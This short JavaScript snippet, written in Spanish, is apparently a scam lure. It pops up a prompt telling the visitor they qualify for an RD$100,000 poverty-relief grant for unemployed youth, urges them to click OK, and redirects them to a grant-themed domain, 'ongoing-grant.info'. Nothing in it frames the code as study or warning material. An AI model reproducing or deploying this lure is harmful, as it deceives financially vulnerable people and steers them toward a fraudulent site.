var password = 'RD$100,000';

password = prompt(
  '¡Felicidades, eres elegible para recibir la SUBVENCIÓN EN EFECTIVO DE RD$100,000 PARA EL ALIVIO DE LA POBREZA PARA JÓVENES DESEMPLEADOS. Haz clic en OK para recibirla al instante.',
  'RD$100,000'
);

if (password !== 'RD$100,000') {
    location.href = 'https://ongoing-grant.info/100000-Empoderamiento-Juvenil.html';
}
